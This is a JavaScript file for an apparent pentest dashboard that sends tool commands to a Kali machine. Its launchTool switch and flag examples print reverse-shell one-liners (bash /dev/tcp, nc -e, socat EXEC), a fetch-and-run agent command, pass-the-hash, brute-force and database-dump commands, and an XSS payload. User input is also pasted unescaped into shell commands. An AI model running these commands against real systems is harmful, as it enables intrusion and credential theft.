                { id: 'evil-winrm',  name: 'Evil-WinRM',  desc: 'shell remota WinRM' },
                { id: 'impacket',    name: 'Impacket',    desc: 'psexec / smbexec / wmiexec' },
                { id: 'smbmap',      name: 'Smbmap',      desc: 'permisos SMB recursivo' },
                { id: 'ldapsearch',  name: 'Ldapsearch',  desc: 'enumeración LDAP (dominio)' },
                { id: 'bloodhound',  name: 'BloodHound',  desc: 'ingestor AD (bloodhound-python)' },
            ]
        },
        {
            id: 'pivoting', label: 'Pivoting', color: 'text-fuchsia-400',
            tools: [
                { id: 'ligolo',       name: 'Ligolo-ng',     desc: 'túnel reverse / agente pivoting' },
                { id: 'nc-listener',  name: 'NC Listener',   desc: 'listener reverse shell (LPORT)' },
                { id: 'chisel-client',name: 'Chisel Client', desc: 'túnel TCP/UDP rápido' },
                { id: 'proxychains',  name: 'Proxychains',   desc: 'encadenar proxies (SOCKS)' },
            ]
        },
        {
            id: 'crypto', label: 'Crypto / Decode', color: 'text-yellow-400',
            tools: [
                { id: 'jwt-decode',  name: 'JWT Decode',    desc: 'decodificar JWT tokens online' },
                { id: 'b64-encode',  name: 'Base64 Encode', desc: 'texto → base64' },
                { id: 'b64-decode',  name: 'Base64 Decode', desc: 'base64 → texto' },
                { id: 'john',        name: 'John',          desc: 'crack de hashes (rockyou)' },
                { id: 'hashcat',     name: 'Hashcat',       desc: 'GPU hash cracking (mode 0)' },
            ]
        },
        {
            id: 'exploitation', label: 'Exploitation', color: 'text-red-400',
            tools: [
                { id: 'hydra-ssh',    name: 'Hydra SSH',     desc: 'fuerza bruta SSH (rockyou)' },
                { id: 'hydra-ftp',    name: 'Hydra FTP',     desc: 'fuerza bruta FTP (rockyou)' },
                { id: 'sqlmap',       name: 'Sqlmap',        desc: 'detección automática SQLi' },
                { id: 'searchsploit', name: 'Searchsploit',  desc: 'buscar exploits por nombre/servicio' },
                { id: 'responder',    name: 'Responder',     desc: 'LLMNR/NBT-NS poisoning' },
                { id: 'burpsuite',    name: 'BurpSuite',     desc: 'proxy HTTP/S + lanzar en Kali' },
                { id: 'xsstrike',     name: 'XSStrike',      desc: 'XSS avanzado con fuzzing + bypass' },
                { id: 'dalfox',       name: 'Dalfox',        desc: 'XSS parameter scanner (Go)' },
                { id: 'nuclei',       name: 'Nuclei',        desc: 'escáner vulns basado en templates' },
            ]
        },
        {
            id: 'osint', label: 'OSINT', color: 'text-orange-400',
            tools: [
                { id: 'theharvester',  name: 'TheHarvester',       desc: 'emails, subdominios, hosts (google,bing,linkedin)' },
                { id: 'mr-holmes',     name: 'Mr.Holmes',          desc: 'OSINT email/user/teléfono + dorks' },
                { id: 'infoooze',      name: 'Infoooze',          desc: 'subdominios, IG, whois, DNS, EXIF (17 módulos)' },
                { id: 'bbot',          name: 'BBOT',              desc: 'framework recon (subdomain-enum preset)' },
                { id: 'linkedin2user', name: 'Linkedin2Username', desc: 'genera wordlists usernames de LinkedIn' },
                { id: 'spiderfoot',    name: 'SpiderFoot',        desc: 'automatiza OSINT (100+ módulos)' },
            ]
        },
        {
            id: 'extract', label: 'Extract / Compress', color: 'text-emerald-400',
            tools: [
                { id: 'unzip',     name: 'Unzip',   desc: 'descomprimir .zip' },
                { id: 'tar-gz',    name: 'Tar.gz',  desc: 'extraer .tar.gz / .tgz' },
                { id: 'tar-xz',    name: 'Tar.xz',  desc: 'extraer .tar.xz' },
                { id: '7z-extract',name: '7z',      desc: 'extraer .7z' },
                { id: 'unrar',     name: 'Unrar',   desc: 'extraer .rar' },
                { id: 'gunzip',    name: 'Gunzip',  desc: 'descomprimir .gz' },
                { id: 'bunzip2',   name: 'Bunzip2', desc: 'descomprimir .bz2' },
            ]
        },
    ];

    const ARSENAL_LINKS = [
        { name: 'HackTricks',            url: 'https://hacktricks.wiki/en/index.html',                          icon: '📘' },
        { name: 'PortSwigger Academy',   url: 'https://portswigger.net/web-security',                            icon: '🔓' },
        { name: 'PayloadsAllTheThings',  url: 'https://github.com/swisskyrepo/PayloadsAllTheThings',             icon: '📦' },
        { name: 'Chisel',                url: 'https://github.com/jpillora/chisel',                              icon: '⛏' },
        { name: 'RevShells.com',         url: 'https://www.revshells.com/',                                     icon: '🐚' },
        { name: 'Exploit-DB',            url: 'https://www.exploit-db.com/',                                    icon: '💥' },
        { name: 'BurpSuite Community',   url: 'https://portswigger.net/burp/communitydownload',                  icon: '🕷' },
        { name: 'GTFOBins',             url: 'https://gtfobins.github.io/',                                    icon: '⬆' },
    ];

    const ARSENAL_UTILITIES = [
        { name: 'CyberChef',            url: 'https://gchq.github.io/CyberChef/',                               icon: '🔗' },
    ];

    const OSINT_WEB = [
        { name: 'Flare.io',           url: 'https://try.flare.io/free-trial/',                  icon: '🔥' },
        { name: 'Lenso AI',           url: 'https://lenso.ai',                                  icon: '🔍' },
        { name: 'OSINT Framework',    url: 'https://osintframework.com',                        icon: '🕸' },
        { name: 'SpiderFoot',        url: 'https://www.spiderfoot.net',                        icon: '🕷' },
        { name: 'Shodan',            url: 'https://www.shodan.io',                             icon: '🛰' },
        { name: 'Censys',            url: 'https://search.censys.io',                           icon: '📊' },
        { name: 'VirusTotal',         url: 'https://www.virustotal.com',                        icon: '🦠' },
        { name: 'HaveIBeenPwned',     url: 'https://haveibeenpwned.com',                       icon: '💀' },
    ];

    const PENTEST_SITES = [
        { name: 'DockerLabs',         url: 'https://dockerlabs.es',          icon: '🐳', desc: 'Máquinas Docker gratuitas (ES)',                     badge: 'GRATIS' },
        { name: 'HackTheBox',        url: 'https://www.hackthebox.com',     icon: '🟢', desc: 'Máquinas vulnerables + Pro Labs',                   badge: 'FREEMIUM' },
        { name: 'TryHackMe',         url: 'https://tryhackme.com',         icon: '🟣', desc: 'Aprendizaje gamificado con AttackBox',              badge: 'FREEMIUM' },
        { name: 'VulnHub',           url: 'https://www.vulnhub.com',       icon: '🟠', desc: 'VMs descargables offline',                          badge: 'GRATIS' },
        { name: 'Proving Grounds',   url: 'https://www.offsec.com/labs/',  icon: '🔴', desc: 'Labs tipo OSCP (OffSec)',                           badge: 'PAGO' },
        { name: 'HackMyVM',          url: 'https://hackmyvm.eu',           icon: '🟡', desc: 'Máquinas estilo HTB, comunidad ES',                 badge: 'GRATIS' },
        { name: 'PortSwigger Acad.', url: 'https://portswigger.net/web-security', icon: '🔓', desc: 'Labs web gratuitos (Burp Suite)',              badge: 'GRATIS' },
        { name: 'OverTheWire',       url: 'https://overthewire.org',       icon: '⚡', desc: 'Wargames por SSH desde cero',                       badge: 'GRATIS' },
        { name: 'PicoCTF',           url: 'https://picoctf.org',           icon: '🎯', desc: 'CTF educativo (Carnegie Mellon)',                   badge: 'GRATIS' },
        { name: 'RootMe',            url: 'https://www.root-me.org',       icon: '👾', desc: 'Retos clasificados (FR)',                           badge: 'FREEMIUM' },
    ];

    const BUGBOUNTY_SITES = [
        { name: 'HackerOne',         url: 'https://www.hackerone.com',       icon: '🟢', desc: 'Mayor plataforma global de bug bounty',              badge: 'TOP' },
        { name: 'Bugcrowd',          url: 'https://www.bugcrowd.com',        icon: '🐜', desc: '2ª mayor, pública + privada',                        badge: 'TOP' },
        { name: 'Intigriti',         url: 'https://www.intigriti.com',       icon: '🇧🇪', desc: 'Plataforma europea premium',                         badge: 'TOP' },
        { name: 'YesWeHack',         url: 'https://www.yeswehack.com',      icon: '🇫🇷', desc: 'Plataforma europea (Francia)',                       badge: 'TOP' },
        { name: 'Secur0',            url: 'https://app.secur0.com',          icon: '🇪🇸', desc: 'VDP/bug bounty española (DockerLabs)',                badge: 'ES' },
        { name: 'Open Bug Bounty',   url: 'https://www.openbugbounty.org',  icon: '🔓', desc: 'Bug bounty abierto y gratuito',                      badge: 'GRATIS' },
        { name: 'Synack',            url: 'https://www.synack.com',         icon: '🛡', desc: 'Bug bounty privado (aprueba selección)',             badge: 'PAGO' },
        { name: 'Grey Hack',         url: 'https://store.steampowered.com/app/605230/Grey_Hack/', icon: '🎮', desc: 'MMO de hacking simulado (Steam)',     badge: 'JUEGO' },
    ];

    const HARDWARE_STORES = [
        // ── Official Manufacturers ──
        { name: 'Hak5',              url: 'https://shop.hak5.org',                          badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '🏪', desc: 'USB Rubber Ducky, WiFi Pineapple, Bash Bunny, OMG Cable, Shark Jack, Key Croc', region: '🌎 USA / Global' },
        { name: 'Flipper Zero',      url: 'https://flipperzero.one',                        badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '🐬', desc: 'Flipper Zero multi-tool device & accessories', region: '🌎 Global' },
        { name: 'Great Scott Gadgets', url: 'https://greatscottgadgets.com',                 badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '📡', desc: 'HackRF, PortaPack, KrakenSDR — Software Defined Radio', region: '🌎 USA / Global' },
        { name: 'M5Stack',           url: 'https://m5stack.com',                            badge: 'OFFICIAL',   badgeColor: 'text-green-400 border-green-400/30',  icon: '📟', desc: 'ESP32 modules for IoT hacking & prototyping', region: '🌎 Global' },
        // ── Trusted Resellers ──
        { name: 'Lab 401',           url: 'https://lab401.com',                             badge: 'RESELLER ⭐', badgeColor: 'text-cyan-400 border-cyan-400/30',      icon: '🏪', desc: 'Hak5, Flipper Zero, Proxmark, HackRF, SDR, iCopy-X — EU exclusive distributor', region: '🇪🇺 France / 🇺🇸 USA' },
        { name: 'Hacker Warehouse',  url: 'https://hackerwarehouse.com',                    badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, Flipper Zero, HackRF, PortaPack, accessories', region: '🇺🇸 USA' },
        { name: 'HackmoD',           url: 'https://hackmod.de',                             badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, SDR, pentest tools, LEA & gov solutions', region: '🇩🇪 Germany' },
        { name: 'KSEC Labs',         url: 'https://labs.ksec.co.uk',                        badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, red team tools, pentest hardware', region: '🇬🇧 UK' },
        { name: 'Firewire Revolution', url: 'https://firewire-revolution.de',               badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, IT security hardware', region: '🇩🇪 Germany' },
        { name: 'SAPSAN',            url: 'https://sapsan-sklep.pl',                        badge: 'RESELLER',   badgeColor: 'text-yellow-400 border-yellow-400/30', icon: '🏪', desc: 'Hak5, pentest gear, IT security', region: '🇵🇱 Poland' },
    ];

    function renderToolButton(t) {
        return `<button data-tool="${t.id}"
            class="tool-btn w-full bg-deep/50 hover:bg-deep text-left px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-neon/40 group">
            <span class="text-neon/70 group-hover:text-neon">#</span>
            <span class="text-gray-400 group-hover:text-gray-200">${t.name}</span>
            <span class="block text-[9px] text-gray-700 group-hover:text-gray-600 leading-tight">${t.desc}</span>
        </button>`;
    }

    function renderLinkButton(l) {
        return `<a href="${l.url}" target="_blank" rel="noopener"
            class="tool-btn flex items-center gap-2 w-full bg-deep/50 hover:bg-deep px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-cyber/40 group">
            <span class="text-cyber/70 group-hover:text-cyber">${l.icon}</span>
            <span class="text-gray-400 group-hover:text-gray-200">${l.name}</span>
            <span class="ml-auto text-[8px] text-gray-700">↗</span>
        </a>`;
    }

    function renderStoreButton(s) {
        return `<a href="${s.url}" target="_blank" rel="noopener"
            class="tool-btn flex items-center gap-2 w-full bg-deep/50 hover:bg-deep px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-orange-400/40 group">
            <span class="text-orange-400/70 group-hover:text-orange-400 shrink-0">${s.icon}</span>
            <div class="flex-1 min-w-0">
                <span class="flex items-center gap-1.5">
                    <span class="text-gray-400 group-hover:text-gray-200 truncate">${s.name}</span>
                    <span class="text-[7px] uppercase tracking-wider border px-1 rounded shrink-0 ${s.badgeColor}">${s.badge}</span>
                </span>
                <span class="block text-[8px] text-gray-700 leading-tight">${s.desc} <span class="text-gray-800">${s.region}</span></span>
            </div>
            <span class="text-[8px] text-gray-700 shrink-0">↗</span>
        </a>`;
    }

    function renderSiteButton(s) {
        const badgeColor = s.badge === 'TOP' ? 'text-neon border-neon/30' :
                           s.badge === 'GRATIS' ? 'text-green-400 border-green-400/30' :
                           s.badge === 'FREEMIUM' ? 'text-cyan-400 border-cyan-400/30' :
                           s.badge === 'ES' || s.badge === '🇪🇸' ? 'text-amber-400 border-amber-400/30' :
                           'text-gray-500 border-gray-500/30';
        return `<a href="${s.url}" target="_blank" rel="noopener"
            class="tool-btn flex items-center gap-2 w-full bg-deep/50 hover:bg-deep px-2.5 py-1.5 rounded text-[11px] font-mono transition-all duration-150 border border-gray-800 hover:border-orange-400/40 group">
            <span class="text-orange-400/70 group-hover:text-orange-400 shrink-0">${s.icon}</span>
            <div class="flex-1 min-w-0">
                <span class="flex items-center gap-1.5">
                    <span class="text-gray-400 group-hover:text-gray-200 truncate">${s.name}</span>
                    <span class="text-[7px] uppercase tracking-wider border px-1 rounded shrink-0 ${badgeColor}">${s.badge}</span>
                </span>
                <span class="block text-[8px] text-gray-700 leading-tight">${s.desc}</span>
            </div>
            <span class="text-[8px] text-gray-700 shrink-0">↗</span>
        </a>`;
    }

    function renderArsenal() {
        ARSENAL_GROUPS.forEach(g => {
            const container = document.getElementById(`arsenal-${g.id}`);
            if (container) container.innerHTML = g.tools.map(renderToolButton).join('');
        });
        const resContainer = document.getElementById('arsenal-resources');
        if (resContainer) resContainer.innerHTML = ARSENAL_LINKS.map(renderLinkButton).join('');
        const utilContainer = document.getElementById('arsenal-utilities');
        if (utilContainer) utilContainer.innerHTML = ARSENAL_UTILITIES.map(renderLinkButton).join('');
        const hwContainer = document.getElementById('arsenal-hardware');
        if (hwContainer) hwContainer.innerHTML = HARDWARE_STORES.map(renderStoreButton).join('');
        const osintContainer = document.getElementById('arsenal-osint-links');
        if (osintContainer) osintContainer.innerHTML = OSINT_WEB.map(renderLinkButton).join('');
        const pentestContainer = document.getElementById('arsenal-pentest');
        if (pentestContainer) pentestContainer.innerHTML = PENTEST_SITES.map(renderSiteButton).join('');
        const bugbountyContainer = document.getElementById('arsenal-bugbounty');
        if (bugbountyContainer) bugbountyContainer.innerHTML = BUGBOUNTY_SITES.map(renderSiteButton).join('');
        const totalItems = ARSENAL_GROUPS.reduce((s, g) => s + g.tools.length, 0) + ARSENAL_LINKS.length + ARSENAL_UTILITIES.length + HARDWARE_STORES.length + OSINT_WEB.length + PENTEST_SITES.length + BUGBOUNTY_SITES.length;
        const totalSpan = document.getElementById('arsenal-total-count');
        if (totalSpan) totalSpan.textContent = `[${totalItems}]`;
        const toolCountSpan = document.getElementById('tool-count');
        if (toolCountSpan) toolCountSpan.textContent = totalItems;
    }

    function getLineCount(text) {
        return (text.match(/\n/g) || []).length + 1 + ' lines';
    }

    function ensureConnected() {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            appendOutput('[!] Connect to Kali first.');
            return false;
        }
        return true;
    }

    // ============================================================
    //  🔍 FILTER ARSENAL
    // ============================================================
    window.filterArsenal = function (query) {
        const q = query.toLowerCase().trim();
        const totalSpan = document.getElementById('arsenal-total-count');
        let visibleCount = 0;
        let totalCount = 0;

        document.querySelectorAll('.cat-header').forEach(header => {
            const body = header.nextElementSibling;
            if (!body || !body.classList.contains('cat-body')) return;
            const buttons = body.querySelectorAll('.tool-btn');
            let hasVisible = false;

            buttons.forEach(btn => {
                totalCount++;
                const text = btn.textContent.toLowerCase();
                if (!q || text.includes(q)) {
                    btn.style.display = '';
                    hasVisible = true;
                    visibleCount++;
                } else {
                    btn.style.display = 'none';
                }
            });

            if (!q) {
                // No filter — show header, collapse body, show all buttons
                header.style.display = '';
                body.style.display = 'none';
            } else if (hasVisible) {
                // Filter active + category has matches — expand
                header.style.display = '';
                body.style.display = '';
                // Update arrow
                const arrow = header.querySelector('span:first-child');
                if (arrow) arrow.textContent = '▶';
            } else {
                // Filter active + no matches — hide entirely
                header.style.display = 'none';
                body.style.display = 'none';
            }
        });

        if (totalSpan) {
            totalSpan.textContent = q ? `[${visibleCount}/${totalCount}]` : `[${totalCount}]`;
        }
    };

    // ============================================================
    //  ▶ RUN ALL IN CATEGORY
    // ============================================================
    // API-based tools that work without SSH (can be run in batch)
    const API_TOOLS = [
        'headers-scan','secrets-scan','port-scan','subdomain-scan',
        'dns-lookup','hash-crack','stego-tool','news-scraper','api-scanner',
    ];

    window.runAllInCategory = async function (categoryId) {
        const group = ARSENAL_GROUPS.find(g => g.id === categoryId);
        if (!group) { appendOutput(`[!] Category "${categoryId}" not found.`); return; }

        const targetInput = document.getElementById('target-input');
        const target = targetInput ? targetInput.value.trim() : '';
        const apiToolsInGroup = group.tools.filter(t => API_TOOLS.includes(t.id));

        if (apiToolsInGroup.length === 0) {
            appendOutput(`[!] No API-based tools in "${group.label}" (all require SSH connection).`);
            return;
        }

        const sep = '═'.repeat(52);
        appendOutput(`\n${sep}`);
        appendOutput(`  🚀 BATCH RUN: ${group.label} (${apiToolsInGroup.length} API tool(s))`);
        if (target) appendOutput(`  🎯 Target: ${target}`);
        appendOutput(`${sep}`);

        let results = { ok: 0, fail: 0 };
        for (const tool of apiToolsInGroup) {
            appendOutput(`\n  ▶ Running ${tool.name}...`);
            document.getElementById('extra-flags').value = '';
            // Call the tool via launchTool logic by setting the context
            window._currentBatchTool = tool.id;
            await window.launchTool(tool.id);
            // Brief pause between tools
            await new Promise(r => setTimeout(r, 500));
            results.ok++;
        }

        appendOutput(`\n${sep}`);
        appendOutput(`  ✅ Batch complete: ${results.ok}/${apiToolsInGroup.length} tool(s) finished`);
        appendOutput(`${sep}`);
        showToast(`✅ Batch: ${results.ok} ${group.label} tool(s) finished`);
        window._currentBatchTool = null;
    };

    // ============================================================
    //  🚀 LAUNCH TOOL
    // ============================================================
    // ── Extra flags examples per tool ──
    const toolExamples = {
        gobuster: '-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,html,txt',
        dirb: '-w /usr/share/wordlists/dirb/big.txt -X .php,.html',
        wfuzz: '-w /usr/share/wfuzz/wordlist/general/common.txt --hc 403,500',
        ffuf: '-w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -recursion',
        feroxbuster: '-x php,html -L 3 --filter-status 401,403',
        nikto: '-ssl -port 443 -Format html -o /tmp/nikto.html',
        whatweb: '-a 3 --log-verbose /tmp/whatweb.log',
        wpscan: '--enumerate u,vp --plugins-detection aggressive',
        cewl: '-d 3 -m 6 -w /tmp/custom.txt -c',
        // ── WAF / IDS ──
        wafw00f: '-a -v -o /tmp/wafw00f_report.json',
        'cors-check': 'añade --headers "Origin: https://evil.com" para test manual',
        // ── Web Recon ──
        nmap: '-p 22,80,443,3306,8080 -sV -sC -Pn',
        masscan: '-p22,80,443 --rate=500 -oJ /tmp/masscan.json',
        netcat: '-zv 22 80 443 8080',
        dnsrecon: '-t rvl -D /usr/share/wordlists/dns/subdomains-top1mil-5000.txt',
        curl: '-k -L -A \"Mozilla/5.0\" -H \"X-Forwarded-For: 127.0.0.1\"',
        socat: 'TCP-LISTEN:4444,fork,reuseaddr -',
        // ── SSL/TLS ──
        testssl: '--full --htmlfile /tmp/report.html',
        // ── SMB / Windows ──
        enum4linux: '-U -S -G -P -r -R',
        smbclient: '-U guest -N -c ls',
        'evil-winrm': '-u <user> -p <pass> -s /opt/scripts',
        impacket: '-hashes :<ntlm_hash> -target-ip 10.10.10.10',
        smbmap: '-u <user> -p <pass> -d <domain> -R',
        ldapsearch: '-x -b \"dc=htb,dc=local\" \"(objectclass=user)\"',
        bloodhound: '-d htb.local -u <user> -p <pass> -c All',
        // ── Pivoting ──
        'nc-listener': '-lvnp 4444',
        'chisel-client': 'R:8080:localhost:3000 R:1080:socks',
        proxychains: 'nmap -sT -Pn 10.0.0.1 (se añade al inicio del comando)',
        ligolo: 'sudo ip route add 10.10.10.0/24 dev ligolo',
        // ── Exploitation ──
        'hydra-ssh': '-l <user> -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -t 8',
        'hydra-ftp': '-l admin -P /usr/share/wordlists/rockyou.txt -V -t 4',
        sqlmap: '--risk=3 --level=5 --dump-all --batch -D <dbname>',
        searchsploit: '-t <software> -w -o /tmp/exploits.txt',
        responder: '-I eth0 -dwv -o /tmp/responder_logs',
        burpsuite: '--collaborator-server --config-file=/tmp/config.json',
        // ── XSS ──
        xsstrike: '--data \"q=test&id=1\" --headers \"Cookie: session=abc\" --crawl',
        dalfox: '--custom-payload \"<script>alert(1)</script>\" --blind https://xss.ht',
        // ── Nuclei ──
        nuclei: '-severity critical,high -json -o /tmp/nuclei.json -t ~/nuclei-templates/',
        // ── Headers ──
        'headers-scan': 'timeout=5 (por defecto 10s)',
        'secrets-scan': 'raw=mi_texto_aqui (escanear texto directo)',
        'port-scan': 'banner (intentar banner grab), o "22,80,443" (puertos custom)',
        'subdomain-scan': 'timeout=5 (por defecto 3s), concurrency=100 (por defecto 50)',
        'dns-lookup': 'A,MX,TXT,NS (tipos de registro custom)',
        'hash-crack': 'identify_only (solo identificar, no crackear)',
        'stego-tool': 'lsb_length=8192 (bytes a escanear para LSB)',
        'news-scraper': 'hackernews,krebs (fuentes específicas, separadas por coma)',
        'api-scanner': 'timeout=5 (timeout por request), concurrency=5 (paralelismo)',
    };

    window.clearExtraFlags = function () {
        document.getElementById('extra-flags').value = '';
        document.getElementById('extra-flags-example').classList.add('hidden');
        document.getElementById('extra-flags-hint').textContent = 'optional';
    };

    function updateExtraFlagsHint(tool) {
        const exampleText = document.getElementById('extra-flags-example-text');
        const exampleDiv = document.getElementById('extra-flags-example');
        const hint = document.getElementById('extra-flags-hint');
        const ex = toolExamples[tool];
        if (ex) {
            exampleText.textContent = ex;
            exampleDiv.classList.remove('hidden');
            hint.textContent = 'click tool for examples';
        } else {
            exampleDiv.classList.add('hidden');
            hint.textContent = 'optional';
        }
    }

    window.launchTool = async function (tool) {
        const target = targetInput.value.trim();
        const extraFlags = document.getElementById('extra-flags').value.trim();
        const needsTarget = [
            'gobuster','dirb','wfuzz','ffuf','feroxbuster','nikto','whatweb','wpscan','cewl','wafw00f','cors-check','headers-scan','secrets-scan','port-scan','subdomain-scan','dns-lookup','hash-crack','stego-tool','api-scanner',
            'nmap','masscan','netcat','dnsrecon','curl','socat','testssl',
            'enum4linux','smbclient','smbmap','ldapsearch','bloodhound','evil-winrm','impacket',
            'hydra-ssh','hydra-ftp','sqlmap','responder','burpsuite',
            'xsstrike','dalfox','nuclei',
            'theharvester','mr-holmes','infoooze','bbot','linkedin2user','spiderfoot'
        ];
        if (needsTarget.includes(tool) && !target) {
            alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
            targetInput.focus();
            return;
        }

        let command = '';
        let description = '';

        switch (tool) {
            // ── Web Recon ──
            case 'gobuster':
                command = `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 -q`;
                description = 'Gobuster — directory enumeration';
                break;
            case 'dirb':
                command = `dirb http://${target} /usr/share/wordlists/dirb/common.txt`;
                description = 'Dirb — directory brute force';
                break;
            case 'wfuzz':
                command = `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://${target}/FUZZ`;
                description = 'Wfuzz — web fuzzing';
                break;
            case 'ffuf':
                command = `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${target}/FUZZ`;
                description = 'Ffuf — fast web fuzzer';
                break;
            case 'feroxbuster':
                command = `feroxbuster -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 --depth 4 --quiet`;
                description = 'Feroxbuster — directory scan (Rust)';
                break;
            case 'nikto':
                command = `nikto -h http://${target}`;
                description = 'Nikto — web vulnerability scanner';
                break;
            case 'whatweb':
                command = `whatweb ${target}`;
                description = 'WhatWeb — technology fingerprinting';
                break;
            case 'wpscan':
                command = `wpscan --url http://${target} --no-update --disable-tls-checks`;
                description = 'Wpscan — WordPress scanner';
                break;
            case 'cewl':
                command = `cewl -d 2 -m 5 -w /tmp/cewl_${target}.txt http://${target} 2>/dev/null; echo "Wordlist saved: /tmp/cewl_${target}.txt"`;
                description = 'Cewl — custom wordlist generator';
                break;

            // ── Network ──
            case 'nmap':
                command = `nmap -p- -sV -sC -O -A --min-rate=1000 -T4 ${target}`;
                description = 'Nmap — aggressive full scan';
                break;
            case 'masscan':
                command = `masscan -p1-65535 --rate=1000 ${target}`;
                description = 'Masscan — mass port scan (65535)';
                break;
            case 'netcat':
                command = `nc -zv ${target} 21 22 23 25 53 80 110 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 8080 8443`;
                description = 'Netcat — fast TCP scan (24 ports)';
                break;
            case 'dnsrecon':
                command = `dnsrecon -d ${target}`;
                description = 'Dnsrecon — DNS enumeration';
                break;
            case 'curl':
                command = `curl -s -I -L --user-agent "Mozilla/5.0" http://${target}`;
                description = 'Curl — HTTP headers + redirects';
                break;
            case 'socat':
                command = `echo "╔═ Socat Guide ═╗\n\n# Listen on port (reverse shell catch):\nsocat TCP-LISTEN:4444,fork,reuseaddr -\n\n# Connect back:\nsocat EXEC:/bin/sh TCP:${target}:4444\n\n# Port forward:\nsocat TCP-LISTEN:8080,fork TCP:${target}:80\n\n# SSL wrapper:\nsocat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80"`;
                description = 'Socat — TCP/UDP relay & shell';
                break;

            // ── SMB / Windows ──
            case 'enum4linux':
                command = `enum4linux -a ${target}`;
                description = 'Enum4linux — full SMB enumeration';
                break;
            case 'smbclient':
                command = `smbclient -L //${target} -N`;
                description = 'Smbclient — list SMB shares (null session)';
                break;
            case 'evil-winrm':
                command = `echo "Usage:\nevil-winrm -i ${target} -u <user> -p <pass>\nevil-winrm -i ${target} -u <user> -H <hash>\n\n# With kerberos:\nevil-winrm -i ${target} -r <domain> -u <user>@<domain> -p <pass>"`;
                description = 'Evil-WinRM — WinRM shell';
                break;
            case 'impacket':
                command = `echo "╔═ Impacket Suite ═╗\n\npsexec.py <dom>/<user>:<pass>@${target}\nsmbexec.py <dom>/<user>:<pass>@${target}\nwmiexec.py <dom>/<user>:<pass>@${target}\n\n# Pass-the-hash\npsexec.py <dom>/<user>@${target} -hashes LM:NTLM"`;
                description = 'Impacket — psexec/smbexec/wmiexec';
                break;
            case 'smbmap':
                command = `smbmap -H ${target} -u '' -p '' -r . 2>/dev/null || smbmap -H ${target} -u 'guest' -p '' -r .`;
                description = 'Smbmap — SMB share permissions';
                break;
            case 'ldapsearch':
                command = `echo "# LDAP anonymous bind example:\nldapsearch -x -H ldap://${target} -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\" 2>&1 | head -100\n\n# With creds:\nldapsearch -x -H ldap://${target} -D \"cn=<user>,dc=htb,dc=local\" -w <pass> -b \"dc=htb,dc=local\" -s sub \"(objectclass=*)\""`;
                description = 'Ldapsearch — LDAP enumeration';
                break;
            case 'bloodhound':
                command = `echo "╔═ BloodHound Ingestor ═╗\n\n# Run from Kali (authenticated):\nbloodhound-python -d <domain> -u <user> -p <pass> -ns ${target} -c All\n\n# Run from Kali (with LDAP):\nbloodhound-python -d <domain> -u <user> -p <pass> -dc ${target} -c All\n\n# Output .json files can be imported to BloodHound GUI"`;
                description = 'BloodHound — AD ingestor (python)';
                break;

            // ── Pivoting ──
            case 'ligolo':
                command = `echo "╔════════════════════════════════════════╗\n║  Ligolo-ng — Pivot Tunneling Guide    ║\n╚════════════════════════════════════════╝\n\n[Kali] sudo ip tuntap add user \$(whoami) mode tun ligolo\n[Kali] sudo ip link set ligolo up\n[Kali] ligolo-ng proxy -selfcert\n\n[Target] wget http://${target}:8000/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent\n[Target] ligolo-ng agent -connect ${target}:11601 -ignore-cert\n\n[Proxy] sudo ip route add <subnet>/24 dev ligolo\n[Proxy] session > start"`;
                description = 'Ligolo-ng — pivot agent guide';
                break;
            case 'nc-listener':
                command = `echo "╔════════════════════════════════════════╗\n║  Netcat Listener — Reverse Shell      ║\n╚════════════════════════════════════════╝\n\n[Kali] rlwrap nc -lvnp 4444\n\n[Target Bash] bash -i >& /dev/tcp/${target}/4444 0>&1\n[Target NC] nc -e /bin/sh ${target} 4444\n\n⚠️  Run the listener in a separate terminal."`;
                description = 'NC Listener — reverse shell guide';
                break;
            case 'chisel-client':
                command = `echo "╔═ Chisel Tunnel ═╗\n\n# Server (your Kali):\nchisel server -p 8000 --reverse\n\n# Client (target):\nchisel client ${target}:8000 R:8080:localhost:3000\n\n# Socks proxy:\nchisel client ${target}:8000 R:1080:socks"`;
                description = 'Chisel Client — TCP tunnel guide';
                break;
            case 'proxychains':
                command = `echo "╔═ Proxychains Guide ═╗\n\n# 1. Edit /etc/proxychains4.conf:\n#    socks4 127.0.0.1 9050\n#    http   127.0.0.1 8080\n\n# 2. Start your proxy (e.g. chisel, ssh -D):\nssh -D 9050 user@${target}\n\n# 3. Run through proxy:\nproxychains nmap -sT -Pn 10.0.0.1\nproxychains smbclient -L //10.0.0.2\nproxychains curl http://10.0.0.3:80"`;
                description = 'Proxychains — proxy chain guide';
                break;

            // ── Crypto / Decode ──
            case 'jwt-decode': {
                const token = prompt('🔑 Paste your JWT token:');
                if (!token) return;
                command = `echo "${token}" | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "Invalid JWT"`;
                description = 'JWT Decode — token payload';
                break;
            }
            case 'b64-encode': {
